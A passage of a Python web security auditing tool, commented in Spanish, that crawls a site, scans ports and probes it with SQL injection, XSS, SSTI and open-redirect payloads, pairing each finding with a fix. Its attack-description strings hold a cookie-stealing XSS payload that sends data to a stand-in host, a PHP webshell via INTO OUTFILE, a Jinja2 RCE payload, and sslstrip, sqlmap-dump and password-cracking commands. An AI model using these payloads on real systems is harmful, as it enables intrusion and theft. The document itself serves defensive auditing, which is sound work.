            if pnum in self.SERVICIOS:
                nombre, nivel, atk, dfs = self.SERVICIOS[pnum]
                color_nivel = col(nivel)
                print(f"      {color_nivel}  │ {ico(nivel)} [{nivel}] {nombre} → {ver_str}{Style.RESET_ALL}")
                if "Empty password" in str(scripts) or "mysql-empty-password" in scripts:
                    nivel = "CRITICA"
                    print(f"      {Fore.RED}  │ ❌ ACCESO SIN CONTRASEÑA CONFIRMADO{Style.RESET_ALL}")
                if "Anonymous FTP login" in str(scripts.get("ftp-anon","")):
                    print(f"      {Fore.RED}  │ ❌ FTP ANÓNIMO ACTIVO — acceso sin credenciales{Style.RESET_ALL}")
                print(f"      {Fore.BLUE}  └────────────────────────────────────────────────{Style.RESET_ALL}")

                res(nivel,f"Puerto {pnum}/tcp → {nombre} ({ver_str})",
                    ataque=atk, defensa=dfs,
                    url_origen=f"{self.hostname}:{pnum}")
                hallazgos.append({"nombre":f"Puerto {pnum} abierto: {nombre}",
                                  "nivel":nivel,
                                  "descripcion":f"Puerto {pnum}/tcp ({nombre}) abierto. {ver_str}",
                                  "solucion":dfs,
                                  "verificacion_manual":f"nmap -sV -p {pnum} {self.hostname}\nnc -v {self.hostname} {pnum}",
                                  "vector_ataque":atk,"defensa":dfs,
                                  "url_origen":f"{self.hostname}:{pnum}"})
            else:
                print(f"      {Fore.YELLOW}  │ ⚠ [{ver_str}] Puerto no catalogado{Style.RESET_ALL}")
                print(f"      {Fore.BLUE}  └────────────────────────────────────────────────{Style.RESET_ALL}")
                res("MEDIA",f"Puerto {pnum}/tcp abierto (no catalogado): {ver_str}",
                    ataque="Puerto no estándar: puede ser admin panel, debug, backdoor.",
                    defensa="Identifica el servicio y cierra si no es necesario.",
                    url_origen=f"{self.hostname}:{pnum}")
                hallazgos.append({"nombre":f"Puerto no estándar: {pnum}",
                                  "nivel":"MEDIA",
                                  "descripcion":f"Puerto {pnum} abierto: {ver_str}",
                                  "solucion":"Identificar y cerrar si no es necesario.",
                                  "verificacion_manual":f"nmap -sV -A -p {pnum} {self.hostname}",
                                  "vector_ataque":"Posible servicio interno expuesto.",
                                  "defensa":"Firewall: cerrar puertos innecesarios.",
                                  "url_origen":f"{self.hostname}:{pnum}"})

            # Alerta TLS débil
            if "ssl-enum-ciphers" in scripts:
                s_out = scripts["ssl-enum-ciphers"]
                if any(p in s_out for p in ["TLSv1.0","TLSv1.1","RC4","WEAK"]):
                    res("ALTA",f"  TLS débil/obsoleto en puerto {pnum}",
                        ataque="Descifrado POODLE/BEAST de sesiones.",
                        defensa="Deshabilitar TLS < 1.2 y cifrados débiles.",
                        url_origen=f"{self.hostname}:{pnum}")

        return hallazgos


# ════════════════════════════════════════════════════════════════════
# AUDITOR PRINCIPAL
# ════════════════════════════════════════════════════════════════════
class AuditorSeguridad:

    def __init__(self, url, max_pages=MAX_PAGES, run_nmap=True):
        self.url       = self._norm(url)
        self.parsed    = urlparse(self.url)
        self.hostname  = self.parsed.hostname or ""
        self.scheme    = self.parsed.scheme
        self.base      = f"{self.parsed.scheme}://{self.parsed.netloc}"
        self.max_pages = max_pages
        self.run_nmap  = run_nmap
        self.session   = requests.Session()
        self.session.headers["User-Agent"] = "Mozilla/5.0 (SecurityAuditor/6.0)"
        self.vulns:       list = []
        self.pages:       dict = {}
        self.response     = None
        self.t0           = time.time()
        self.es_tienda    = False
        self.tecnologias  = []
        self.vt           = VerificadorTerminal  # alias

    def _norm(self, url):
        url = url.strip()
        if not url.startswith(("http://","https://")): url = "https://"+url
        return url

    def _reg(self, nombre, nivel, desc, sol, ver="", ataque="", defensa="",
             refs="", url_origen=""):
        self.vulns.append({"nombre":nombre,"nivel":nivel,
                           "descripcion":desc,"solucion":sol,
                           "verificacion_manual":ver,"vector_ataque":ataque,
                           "defensa":defensa,"referencias":refs,
                           "url_origen":url_origen})

    def _get(self, path, timeout=6, redir=False, extra_headers=None, base=None):
        try:
            h = dict(self.session.headers)
            if extra_headers: h.update(extra_headers)
            target = urljoin(base or self.base, path)
            return requests.get(target, timeout=timeout, verify=False,
                                allow_redirects=redir, headers=h)
        except Exception:
            return None

    # ── FASE 1: CRAWLING ────────────────────────────────────────
    def fase_crawling(self):
        titulo("FASE 1 — RASTREO DE PÁGINAS HTML")
        crawler = Crawler(self.url, self.max_pages, self.session)
        self.pages = crawler.crawl()
        if self.url in self.pages:
            self.response = self.pages[self.url]
        elif self.pages:
            self.response = list(self.pages.values())[0]

    # ── FASE 2: NMAP ─────────────────────────────────────────────
    def fase_nmap(self):
        titulo("FASE 2 — ANÁLISIS DE PUERTOS (NMAP)")
        try:
            ip = socket.gethostbyname(self.hostname)
        except Exception:
            ip = self.hostname
        nmap = AnalizadorNmap(self.hostname, ip)
        for h in nmap.ejecutar():
            self.vulns.append(h)

    # ════════════════════════════════════════════════════════════
    # FASE 3: ANÁLISIS WEB
    # ════════════════════════════════════════════════════════════
    def fase_analisis(self):
        titulo("FASE 3 — ANÁLISIS DE SEGURIDAD WEB")

    # ── 3.1 SSL ──────────────────────────────────────────────────
    def verificar_ssl(self):
        sub("3.1 Certificado TLS/SSL")
        self.vt.verificar_ssl_terminal(self.hostname)
        if self.scheme == "http":
            res("CRITICA","El sitio usa HTTP — sin cifrado",
                ataque="Wireshark: sudo tcpdump -i eth0 -A host "+self.hostname,
                defensa=f"certbot --nginx -d {self.hostname}",
                url_origen=self.url)
            self._reg("HTTP sin cifrado","CRITICA","Sin TLS.",
                      f"certbot --nginx -d {self.hostname}",
                      f"curl -I http://{self.hostname} | grep Location",
                      "Captura de tráfico completa.",
                      "TLS + HSTS.", url_origen=self.url)
            return
        try:
            ctx = ssl.create_default_context()
            with ctx.wrap_socket(
                    socket.create_connection((self.hostname,443),timeout=TIMEOUT),
                    server_hostname=self.hostname) as s:
                cert=s.getpeercert(); proto=s.version(); cipher=s.cipher()
            res("OK",f"TLS: {proto}  |  Cifrado: {cipher[0] if cipher else 'N/A'}")
            if proto in ("SSLv2","SSLv3","TLSv1","TLSv1.1"):
                res("ALTA",f"Protocolo obsoleto: {proto}",
                    ataque="POODLE/BEAST: descifrado de sesiones TLS.",
                    defensa="ssl_protocols TLSv1.2 TLSv1.3;",url_origen=self.url)
                self._reg(f"TLS obsoleto ({proto})","ALTA",f"{proto} vulnerable.",
                          "ssl_protocols TLSv1.2 TLSv1.3;","",
                          "POODLE/BEAST.","Deshabilitar TLS < 1.2.",url_origen=self.url)
            not_after=cert.get("notAfter","")
            if not_after:
                exp=datetime.datetime.strptime(not_after,"%b %d %H:%M:%S %Y %Z")
                dias=(exp-datetime.datetime.utcnow()).days
                if dias<0:
                    res("CRITICA","¡Certificado EXPIRADO!",url_origen=self.url)
                    self._reg("Cert expirado","CRITICA","Expirado.",
                              "certbot renew --force-renewal","","","",url_origen=self.url)
                elif dias<15:
                    res("ALTA",f"Expira en {dias} días",url_origen=self.url)
                else:
                    res("OK",f"Certificado válido {dias} días más")
        except ssl.SSLCertVerificationError as e:
            res("CRITICA","Certificado SSL inválido",str(e)[:80],url_origen=self.url)
        except Exception as e:
            res("MEDIA",f"No se pudo inspeccionar SSL: {e}")

    # ── 3.2 CABECERAS ────────────────────────────────────────────
    # Estrategia anti-duplicados:
    #   - Analiza la página PRINCIPAL para obtener el valor de la cabecera
    #   - Si falta, recorre el resto de páginas para listar cuáles también fallan
    #   - Registra UNA sola vulnerabilidad con la lista completa de URLs afectadas
    def verificar_cabeceras(self):
        sub("3.2 Cabeceras de seguridad HTTP")
        if not self.pages:
            return

        cabeceras_req = {
            "strict-transport-security": ("ALTA",
                "Sin HSTS → SSL stripping posible.",
                "Strict-Transport-Security: max-age=31536000; includeSubDomains; preload",
                "sslstrip intercepta la primera petición HTTP:\n"
                "  sslstrip -l 8080 & arpspoof -i eth0 -t VICTIMA ROUTER\n"
                "La víctima navega por HTTP sin saberlo."),
            "content-security-policy": ("ALTA",
                "Sin CSP → XSS sin restricción.",
                "Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'",
                "XSS: <img src=x onerror=\"fetch('https://atk.com/?c='+document.cookie)\">"),
            "x-frame-options": ("MEDIA",
                "Sin X-Frame-Options → Clickjacking posible.",
                "X-Frame-Options: DENY",
                "Clickjacking: iframe invisible sobre botón de pago.\n"
                "  <iframe src='URL' style='opacity:0.01;position:absolute;top:0'>"),
            "x-content-type-options": ("MEDIA",
                "Sin X-Content-Type-Options → MIME sniffing.",
                "X-Content-Type-Options: nosniff",
                "Subir .jpg con contenido HTML/JS → el navegador lo ejecuta como script."),
            "referrer-policy": ("BAJA",
                "Sin Referrer-Policy → URLs internas filtradas a terceros.",
                "Referrer-Policy: strict-origin-when-cross-origin", ""),
            "permissions-policy": ("BAJA",
                "Sin Permissions-Policy → sin restricción a APIs del navegador.",
                "Permissions-Policy: geolocation=(), microphone=(), camera=()", ""),
        }

        # Recopilar datos de TODAS las páginas antes de imprimir nada
        # cabecera → {"ok": bool, "valor": str, "ausente_en": [urls], "ok_en": [urls]}
        resumen: dict = {}
        for cab in cabeceras_req:
            resumen[cab] = {"ok": False, "valor": "", "ausente_en": [], "ok_en": []}

        # Cabeceras que revelan info: valor único por tipo
        reveladas: dict = {}  # cab → (valor, primera_url)

        for page_url, page_r in self.pages.items():
            if not page_r:
                continue
            h = {k.lower(): v for k, v in page_r.headers.items()}

            for cab in cabeceras_req:
                if cab in h:
                    resumen[cab]["ok_en"].append(page_url)
                    if not resumen[cab]["valor"]:
                        resumen[cab]["valor"] = h[cab]
                        resumen[cab]["ok"] = True
                else:
                    resumen[cab]["ausente_en"].append(page_url)

            for cab in ("server", "x-powered-by", "x-aspnet-version"):
                if cab in h and cab not in reveladas:
                    reveladas[cab] = (h[cab], page_url)

        # ── Imprimir cabeceras de seguridad (UNA entrada por cabecera) ──
        for cab, (nivel, desc, sol, atk) in cabeceras_req.items():
            datos = resumen[cab]
            ausentes = datos["ausente_en"]
            presentes = datos["ok_en"]

            if not ausentes:
                # Presente en todas las páginas
                val = datos["valor"]
                res("OK", f"{cab}: {val[:80]}")
                # Verificación terminal (solo una vez, en la URL principal)
                self.vt.verificar_cabecera(self.url, cab)
                # Checks de calidad del valor
                if cab == "strict-transport-security":
                    m = re.search(r"max-age=(\d+)", val, re.I)
                    if m and int(m.group(1)) < 15768000:
                        res("BAJA", f"HSTS max-age demasiado corto: {m.group(1)}s (< 6 meses)",
                            ataque="sslstrip funciona durante el intervalo sin HSTS.",
                            defensa="Sube a max-age=31536000 (1 año)")
                        self._reg("HSTS max-age insuficiente", "BAJA",
                                  f"max-age={m.group(1)}s es inferior al mínimo recomendado.",
                                  "max-age=31536000; includeSubDomains; preload",
                                  f"curl -I {self.url} | grep -i strict-transport",
                                  "sslstrip durante ventana sin HSTS.",
                                  "Aumentar max-age a 1 año.", url_origen=self.url)
                if cab == "content-security-policy":
                    csp = val.lower()
                    if "'unsafe-inline'" in csp:
                        res("MEDIA", "CSP contiene 'unsafe-inline' → protección XSS reducida",
                            ataque="Scripts inline maliciosos se ejecutan si hay inyección HTML.",
                            defensa="Elimina unsafe-inline. Usa nonces por request.")
                        self._reg("CSP con unsafe-inline", "MEDIA",
                                  "unsafe-inline permite scripts inline → XSS posible.",
                                  "Usa nonces: script-src 'nonce-RANDOM'",
                                  f"curl -I {self.url} | grep content-security-policy",
                                  "Scripts inline maliciosos ejecutables.",
                                  "Nonces únicos por request.", url_origen=self.url)
            else:
                # Falta en al menos una página → UN solo reporte con lista
                n_ausente = len(ausentes)
                n_total   = len(self.pages)
                sufijo    = f"({n_ausente}/{n_total} páginas afectadas)"

                # Construir detalle de URLs afectadas (máx 8 en pantalla)
                lista_urls = "\n".join(f"  • {u}" for u in ausentes[:8])
                if n_ausente > 8:
                    lista_urls += f"\n  ... y {n_ausente - 8} más"

                res(nivel, f"FALTA: {cab.upper()} — {sufijo}",
                    detalle=lista_urls,
                    ataque=atk,
                    defensa=sol)

                # Verificación terminal solo en la primera URL afectada
                self.vt.verificar_cabecera(ausentes[0], cab)

                # Registro único
                self._reg(
                    f"Cabecera ausente: {cab.upper()}",
                    nivel,
                    f"{desc}\nAusente en {n_ausente} de {n_total} páginas:\n{lista_urls}",
                    sol,
                    f"curl -I {ausentes[0]} | grep -i {cab}",
                    atk,
                    sol,
                    url_origen=ausentes[0] if n_ausente == 1
                               else f"{n_ausente} páginas (ver descripción)"
                )

        # ── Cabeceras que revelan información (una entrada por cabecera) ──
        desc_exp = {
            "server":           "Revela tecnología y versión del servidor web.",
            "x-powered-by":     "Revela lenguaje o framework backend.",
            "x-aspnet-version": "Revela versión de ASP.NET.",
        }
        for cab, (val, primera_url) in reveladas.items():
            res("MEDIA", f"Cabecera informativa expuesta: {cab}: {val}",
                detalle=desc_exp.get(cab, ""),
                ataque=f"Con '{val}' el atacante busca CVEs y exploits:\n"
                       f"  searchsploit '{val}'\n"
                       f"  https://cve.mitre.org → busca la versión exacta",
                defensa="Nginx: server_tokens off;\nApache: ServerTokens Prod\n"
                        f"Elimina la cabecera: Header unset {cab}")
            self.vt.verificar_cabecera(primera_url, cab)
            self._reg(f"Cabecera expuesta: {cab}", "MEDIA",
                      f"{desc_exp.get(cab,'')} Valor detectado: '{val}'",
                      f"server_tokens off; Header unset {cab}",
                      f"curl -I {primera_url} | grep -i {cab}",
                      f"Búsqueda de exploits para '{val}' en exploit-db.com.",
                      "Enmascarar o eliminar cabeceras informativas.",
                      url_origen=primera_url)

    # ── 3.3 COOKIES ──────────────────────────────────────────────
    def verificar_cookies(self):
        sub("3.3 Cookies")
        if not self.response: return
        raw_list=[]
        if hasattr(self.response.raw.headers,"getlist"):
            raw_list=self.response.raw.headers.getlist("Set-Cookie")
        cookies_info=[]
        for raw in raw_list:
            low=raw.lower(); name=raw.split("=")[0].strip()
            ss_m=re.search(r"samesite=(\w+)",low)
            cookies_info.append({"name":name,"secure":"secure" in low,
                                 "httponly":"httponly" in low,
                                 "samesite":ss_m.group(1) if ss_m else "","raw":raw[:200]})
        if not cookies_info:
            for ck in self.response.cookies:
                cookies_info.append({"name":ck.name,"secure":ck.secure,
                                     "httponly":ck.has_nonstandard_attr("HttpOnly"),
                                     "samesite":ck.get_nonstandard_attr("SameSite") or "","raw":""})
        if not cookies_info:
            res("INFO","No se recibieron cookies en la página principal"); return

        for ck in cookies_info:
            nombre=ck["name"]
            res("INFO",f"Cookie detectada: {nombre}")
            self.vt.verificar_cookie(self.url, nombre)
            if not ck["secure"]:
                res("ALTA",f"  '{nombre}' sin Secure",
                    ataque="Session hijacking vía MITM+sslstrip:\n"
                           "  sslstrip captura la cookie en HTTP → atacante suplanta al usuario.",
                    defensa=f"Set-Cookie: {nombre}=valor; Secure; HttpOnly; SameSite=Strict",
                    url_origen=self.url)
                self._reg(f"Cookie sin Secure: {nombre}","ALTA","Sin Secure.",
                          f"Secure; HttpOnly; SameSite=Strict",
                          f"curl -I {self.url} | grep -i set-cookie",
                          "Session hijacking.",
                          "Flag Secure + HSTS.",url_origen=self.url)
            if not ck["httponly"]:
                res("ALTA",f"  '{nombre}' sin HttpOnly",
                    ataque="XSS roba la cookie:\n"
                           "  document.cookie → enviado a servidor atacante via fetch()",
                    defensa="HttpOnly en todas las cookies de sesión.",
                    url_origen=self.url)
                self._reg(f"Cookie sin HttpOnly: {nombre}","ALTA","Sin HttpOnly.",
                          "HttpOnly; Secure; SameSite=Strict",
                          "DevTools → Console → document.cookie",
                          "XSS + robo de sesión.",
                          "HttpOnly + CSP.",url_origen=self.url)
            if not ck["samesite"]:
                res("MEDIA",f"  '{nombre}' sin SameSite",
                    ataque="CSRF: formulario en sitio malicioso envía cookie automáticamente.",
                    defensa="SameSite=Strict",url_origen=self.url)
                self._reg(f"Cookie sin SameSite: {nombre}","MEDIA","Sin SameSite.",
                          "SameSite=Strict; HttpOnly; Secure",
                          f"curl -I {self.url} | grep set-cookie",
                          "CSRF.",
                          "SameSite=Strict.",url_origen=self.url)

    # ── 3.4 DNS ──────────────────────────────────────────────────
    def verificar_dns(self):
        sub("3.4 Registros DNS")
        try:
            ip=socket.gethostbyname(self.hostname)
            res("OK",f"DNS: {self.hostname} → {ip}")
        except Exception:
            res("CRITICA",f"No se pudo resolver: {self.hostname}"); return

        self.vt.verificar_dns_terminal(self.hostname,"TXT")

        if not DNS_OK:
            res("INFO","pip install dnspython para análisis DNS completo"); return
        rv=dns.resolver.Resolver(); rv.timeout=rv.lifetime=5
        def q(qname,qtype):
            try: return list(rv.resolve(qname,qtype))
            except: return []

        spf=[str(r) for r in q(self.hostname,"TXT") if "v=spf1" in str(r).lower()]
        if not spf:
            res("MEDIA","Sin registro SPF",
                ataque=f"Email spoofing: swaks --to victima@empresa.com --from ceo@{self.hostname}",
                defensa=f"v=spf1 include:_spf.{self.hostname} -all",
                url_origen=self.hostname)
            self._reg("Sin SPF","MEDIA","Sin SPF.",
                      f"v=spf1 -all",f"dig TXT {self.hostname}",
                      "Email spoofing para phishing.",
                      "SPF+DMARC+DKIM.",url_origen=self.hostname)
        else:
            res("OK",f"SPF: {spf[0][:70]}")

        dmarc=q(f"_dmarc.{self.hostname}","TXT")
        if not [r for r in dmarc if "v=dmarc1" in str(r).lower()]:
            res("MEDIA","Sin DMARC",
                ataque="Correos falsos llegan a la bandeja sin ser rechazados.",
                defensa=f"v=DMARC1; p=reject; rua=mailto:dmarc@{self.hostname}",
                url_origen=self.hostname)
            self._reg("Sin DMARC","MEDIA","Sin DMARC.",
                      f"v=DMARC1; p=reject; rua=mailto:dmarc@{self.hostname}",
                      f"dig TXT _dmarc.{self.hostname}",
                      "Phishing con dominio legítimo.",
                      "DMARC p=reject.",url_origen=self.hostname)
        else:
            res("OK","DMARC configurado ✓")

    # ── 3.5 RUTAS SENSIBLES ──────────────────────────────────────
    def verificar_rutas_sensibles(self):
        sub("3.5 Archivos y rutas sensibles")
        rutas=[
            ("/.env",        "CRITICA","Variables entorno",
             "Contiene DB_PASSWORD, API_KEY, AWS_KEY, SECRET_KEY...\n"
             "Todo el acceso a infraestructura comprometido con un solo archivo.",
             "Mover fuera del webroot. Nginx: location /.env { deny all; }"),
            ("/.git/config", "CRITICA","Git expuesto",
             "git-dumper reconstruye el código fuente completo:\n"
             "  pip install git-dumper && git-dumper {BASE}/.git ./repo",
             "Nginx: location /.git { deny all; return 404; }"),
            ("/wp-config.php","CRITICA","WordPress config",
             "Credenciales BD en texto plano → extracción completa de datos.",
             "Mover fuera del webroot. chmod 600."),
            ("/wp-login.php","ALTA","WordPress Login",
             "WPScan fuerza bruta: wpscan --url URL --passwords rockyou.txt\n"
             "xmlrpc.php: fuerza bruta en lote sin rate limiting.",
             "Bloquea xmlrpc.php. Plugin de seguridad. 2FA."),
            ("/phpmyadmin",  "ALTA","phpMyAdmin",
             "Acceso BD + RCE via SELECT INTO OUTFILE.\n"
             "  SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/shell.php'",
             "Solo accesible desde IP de administración."),
            ("/.htpasswd",   "CRITICA","Contraseñas htpasswd",
             "hashcat -m 1600 htpasswd.txt rockyou.txt → crackeo rápido.",
             "Nginx: location /.htpasswd { deny all; }"),
            ("/phpinfo.php", "ALTA","PHP Info",
             "Revela: versión PHP exacta, rutas absolutas, variables de entorno,\n"
             "extensiones → mapa completo para explotar el servidor.",
             "Elimina en producción."),
            ("/backup.sql",  "CRITICA","Dump SQL","BD completa descargable.",""),
            ("/actuator/env","CRITICA","Actuator env","Variables de entorno Spring Boot.",""),
            ("/swagger.json","MEDIA","API spec","Mapa completo de la API.",""),
            ("/graphql",     "MEDIA","GraphQL",
             "Introspection: {__schema{types{name}}} → esquema completo.",
             "Desactiva introspección en producción."),
            ("/.aws/credentials","CRITICA","AWS credentials","Acceso a infraestructura cloud.",""),
            ("/docker-compose.yml","ALTA","Docker Compose","Config de contenedores.",""),
            ("/server-status","MEDIA","Apache status","Info interna del servidor.",""),
        ]

        for ruta,nivel,descripcion,atk,dfs in rutas:
            url_completa=f"{self.base}{ruta}"
            # Verificación real con curl en terminal
            accesible, code = self.vt.verificar_url_accesible(url_completa, descripcion)
            # Verificación con requests también
            r=self._get(ruta)
            if r and r.status_code==200:
                size=len(r.content)
                res(nivel,f"[200] ACCESIBLE: {ruta} → {descripcion} ({size}B)",
                    ataque=atk or f"Acceso no autorizado a {descripcion}.",
                    defensa=dfs or f"Nginx: location \"{ruta}\" {{ deny all; return 404; }}",
                    url_origen=url_completa)
                self._reg(f"Recurso sensible: {ruta}",nivel,
                          f"'{ruta}' ({descripcion}) público. {size}B.",
                          f"Nginx: location \"{ruta}\" {{ deny all; return 404; }}",
                          f"curl -s {url_completa} | head -20",
                          atk or "Acceso a información sensible.",
                          dfs or "Bloquear en servidor.",url_origen=url_completa)
            elif r and r.status_code==403 and nivel in ("CRITICA","ALTA"):
                res("BAJA",f"[403] Bloqueado correctamente: {ruta}")

    # ── 3.6 INYECCIONES SQL + XSS + SSTI (todas las páginas) ────
    def verificar_inyecciones(self):
        sub("3.6 Pruebas de inyección SQL, XSS y SSTI")

        # ── Recopilar URLs con parámetros de todas las páginas ───
        # Clave: (path_normalizado, param) → primera URL completa con ese param
        # Así evitamos probar el mismo parámetro en 20 páginas distintas
        param_index: dict = {}   # (path, param) → url_con_params

        for page_url, page_r in self.pages.items():
            p = urlparse(page_url)
            base_path = f"{p.scheme}://{p.netloc}{p.path}"

            # Parámetros en la URL de la página rastreada
            if p.query:
                for k, v in urllib.parse.parse_qsl(p.query):
                    key = (base_path, k)
                    if key not in param_index:
                        param_index[key] = (page_url, {k: v})

            # Links con parámetros en el HTML
            if page_r:
                html = page_r.text or ""
                for href in re.findall(
                        r'<a(?:\s[^>]*)?\shref=["\']([^"\']*\?[^"\']+)["\']', html, re.I):
                    full = urljoin(page_url, href)
                    fp = urlparse(full)
                    if fp.netloc != self.parsed.netloc or not fp.query:
                        continue
                    bpath = f"{fp.scheme}://{fp.netloc}{fp.path}"
                    for k, v in urllib.parse.parse_qsl(fp.query):
                        key = (bpath, k)
                        if key not in param_index:
                            param_index[key] = (full, {k: v})

        if not param_index:
            res("INFO",
                f"Sin parámetros GET para probar en {len(self.pages)} páginas rastreadas",
                ataque="Prueba manual:\n"
                       f"  {self.url}?id=1'   → ¿error SQL?\n"
                       f"  {self.url}?q=<script>alert(1)</script> → ¿alert?")
            return

        # Agrupar por path para mostrar resumen limpio
        paths_unicos = len({k[0] for k in param_index})
        params_unicos = len(param_index)
        res("INFO",
            f"Parámetros únicos a probar: {params_unicos} "
            f"en {paths_unicos} rutas distintas")

        # ── Payloads ─────────────────────────────────────────────
        sqli_payloads = [
            ("'",                  "comilla simple — error de sintaxis básico"),
            ("1' OR '1'='1",       "bypass clásico OR"),
            ("' OR 1=1--",         "OR con comentario SQL"),
            ("1' UNION SELECT NULL--", "UNION test"),
            ("1' AND SLEEP(2)--",  "time-based (blind SQLi)"),
        ]
        errores_sql = [
            ("sql syntax",               "MySQL",       "error de sintaxis MySQL"),
            ("you have an error in your sql", "MySQL",  "error MySQL clásico"),
            ("mysql_fetch",              "MySQL",       "función PHP MySQL expuesta"),
            ("ora-",                     "Oracle",      "error Oracle DB"),
            ("sqlite_",                  "SQLite",      "error SQLite"),
            ("sqlexception",             "Java/JDBC",   "excepción SQL Java"),
            ("unclosed quotation",       "MSSQL",       "MSSQL comilla sin cerrar"),
            ("pg_query",                 "PostgreSQL",  "función PHP PostgreSQL"),
            ("warning: mysql",           "MySQL",       "warning MySQL en PHP"),
            ("pdoexception",             "PHP PDO",     "excepción PDO expuesta"),
            ("sqlstate",                 "Genérico",    "SQLSTATE expuesto"),
            ("microsoft ole db",         "MSSQL",       "OLE DB de Microsoft"),
            ("db2 sql error",            "DB2",         "error IBM DB2"),
        ]

        xss_marker  = "XSS7W1AUDIT"
        xss_payload = f"<ScRiPt>alert('{xss_marker}')</ScRiPt>"
        ssti_payload = "{{7*7}}"

        # Deduplicación de hallazgos: no reportar el mismo (tipo, param) dos veces
        ya_reportado: set = set()   # ("sqli"|"xss"|"ssti"|"redirect", param)

        for (base_path, param), (page_url, params) in list(param_index.items())[:30]:

            # ════ SQLi ══════════════════════════════════════════
            key_sql = ("sqli", param)
            if key_sql not in ya_reportado:
                print(f"\n  {Fore.MAGENTA}  ─ SQLi: '{param}' @ {base_path[:65]}{Style.RESET_ALL}")
                sqli_ok = False

                for payload, desc_payload in sqli_payloads:
                    if sqli_ok:
                        break
                    pt       = {**params, param: payload}
                    url_test = f"{base_path}?{urllib.parse.urlencode(pt)}"

                    # Verificación terminal (curl)
                    vuln_t, tipo_bd = self.vt.verificar_sqli_terminal(url_test, param)

                    # Verificación con requests como respaldo
                    if not vuln_t:
                        try:
                            r_sql  = requests.get(url_test, timeout=7, verify=False,
                                                  headers=dict(self.session.headers),
                                                  allow_redirects=False)
                            body_l = (r_sql.text or "").lower()
                            for err_str, bd, _ in errores_sql:
                                if err_str in body_l:
                                    vuln_t  = True
                                    tipo_bd = bd
                                    break
                        except Exception:
                            pass

                    if vuln_t:
                        sqli_ok = True
                        ya_reportado.add(key_sql)
                        res("CRITICA",
                            f"¡SQL INJECTION! parámetro '{param}' — BD: {tipo_bd}",
                            f"Payload: {payload}  ({desc_payload})",
                            ataque="sqlmap extrae la BD completa automáticamente:\n"
                                   f"  sqlmap -u '{base_path}?{param}=1' -p {param} "
                                   f"--dbs --dump --batch\n"
                                   "Bypass de login: usuario=' OR 1=1-- / pass: cualquier\n"
                                   "En MySQL con permisos FILE: escribir webshell → RCE",
                            defensa="Usa siempre prepared statements:\n"
                                    "  PHP PDO: $st=$pdo->prepare('SELECT * FROM t WHERE id=?');\n"
                                    "           $st->execute([$id]);\n"
                                    "  Python:  cursor.execute('SELECT * FROM t WHERE id=%s',(id,))\n"
                                    "  WAF: mod_security o Cloudflare WAF como segunda capa",
                            url_origen=page_url)
                        self._reg(f"SQL Injection — {param}", "CRITICA",
                                  f"SQLi en '{param}' en {page_url}. BD: {tipo_bd}.\n"
                                  f"Payload confirmado: {payload}",
                                  "Prepared statements siempre. Nunca concatenar variables en SQL.",
                                  f"sqlmap -u '{base_path}?{param}=1' -p {param} --dbs --batch",
                                  "Extracción BD completa, bypass de login, RCE vía FILE.",
                                  "Prepared statements + WAF + mínimo privilegio en BD.",
                                  url_origen=page_url)

            # ════ XSS reflejado ══════════════════════════════════
            key_xss = ("xss", param)
            if key_xss not in ya_reportado:
                pt_xss   = {**params, param: xss_payload}
                url_xss  = f"{base_path}?{urllib.parse.urlencode(pt_xss)}"
                print(f"  {Fore.MAGENTA}  ─ XSS:  '{param}' @ {base_path[:65]}{Style.RESET_ALL}")

                vuln_xss = self.vt.verificar_xss_terminal(url_xss, param, xss_marker)
                if not vuln_xss:
                    try:
                        r_xss  = requests.get(url_xss, timeout=7, verify=False,
                                              headers=dict(self.session.headers),
                                              allow_redirects=False)
                        body_x = r_xss.text or ""
                        if (xss_marker.lower() in body_x.lower()
                                and "<script" in body_x.lower()):
                            vuln_xss = True
                    except Exception:
                        pass

                if vuln_xss:
                    ya_reportado.add(key_xss)
                    res("CRITICA", f"¡XSS REFLEJADO! parámetro '{param}'",
                        ataque="Robar cookie de sesión:\n"
                               f"  ?{param}=<img src=x onerror=\""
                               "fetch('https://atk.com/?c='+document.cookie)\">\n"
                               "Keylogging, redirección a phishing, BeEF browser exploitation.",
                        defensa="htmlspecialchars($var, ENT_QUOTES, 'UTF-8') en PHP\n"
                                "{{ variable }} en Django/Jinja2 (auto-escape)\n"
                                "Content-Security-Policy: default-src 'self'",
                        url_origen=page_url)
                    self._reg(f"XSS Reflejado — {param}", "CRITICA",
                              f"XSS en '{param}' en {page_url}",
                              "htmlspecialchars() + CSP strict",
                              f"Abre: {url_xss}",
                              "Robo de cookies, keylogging, phishing.",
                              "Output encoding + CSP + HttpOnly en cookies.",
                              url_origen=page_url)

            # ════ SSTI ══════════════════════════════════════════
            key_ssti = ("ssti", param)
            if key_ssti not in ya_reportado:
                pt_ssti  = {**params, param: ssti_payload}
                url_ssti = f"{base_path}?{urllib.parse.urlencode(pt_ssti)}"
                try:
                    r_ssti = requests.get(url_ssti, timeout=7, verify=False,
                                          headers=dict(self.session.headers),
                                          allow_redirects=False)
                    if "49" in (r_ssti.text or ""):
                        ya_reportado.add(key_ssti)
                        print(f"\n      {Fore.BLUE+Style.BRIGHT}  ┌─ TERMINAL: verificando SSTI ──────────────────────{Style.RESET_ALL}")
                        print(f"      {Fore.RED}  │ ❌ El payload {{{{7*7}}}} devolvió '49'{Style.RESET_ALL}")
                        print(f"      {Fore.RED}  │    El servidor EJECUTÓ la expresión → SSTI CONFIRMADO{Style.RESET_ALL}")
                        print(f"      {Fore.BLUE}  └────────────────────────────────────────────────{Style.RESET_ALL}")
                        res("CRITICA", f"¡TEMPLATE INJECTION (SSTI)! parámetro '{param}'",
                            ataque="Jinja2 RCE directo:\n"
                                   "  {{config.__class__.__init__.__globals__['os'].popen('id').read()}}\n"
                                   "Twig (PHP): {{_self.env.registerUndefinedFilterCallback('exec')}}\n"
                                   "Resultado: ejecución de comandos como el usuario del servidor web.",
                            defensa="Nunca renderices input del usuario como template.\n"
                                    "Usa sandboxing del motor de plantillas.",
                            url_origen=page_url)
                        self._reg(f"SSTI — {param}", "CRITICA",
                                  f"Template injection en '{param}' en {page_url}",
                                  "No renderizar input como template. Sandboxing.",
                                  f"Abre: {url_ssti}  → ¿aparece 49?",
                                  "RCE: ejecución de comandos arbitrarios en el servidor.",
                                  "Sandboxing del motor de templates.",
                                  url_origen=page_url)
                except Exception:
                    pass

            # ════ Open Redirect ══════════════════════════════════
            key_rd = ("redirect", param)
            if key_rd not in ya_reportado:
                pt_rd  = {**params, param: "https://evil.example.com"}
